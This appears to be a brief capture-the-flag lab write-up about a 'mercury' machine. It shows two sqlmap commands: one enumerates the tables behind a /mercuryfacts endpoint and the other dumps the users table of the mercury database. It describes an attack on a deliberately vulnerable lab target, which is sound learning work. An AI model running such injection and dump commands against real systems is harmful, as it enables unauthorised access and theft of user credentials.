# sqlmap
We found out in the http 8080 of the mercury machine had the /mercuryfacts directory and the /mercuryfacts/todo
directory which had mentioned about changing from direct mysql call to django for better security.  
- sqlmap -u "http://192.168.56.102:8080/mercuryfacts/1" --tables --batch  
(add screenshot)  

Then all we had to do was perform sql injection and ask what we needed.  
I found out that there were 2 databases and dumbped the database data.  
- sqlmap -u "http://192.168.56.102:8080/mercuryfacts/1" -D mercury -T users --dump --batch  
(add screenshots)

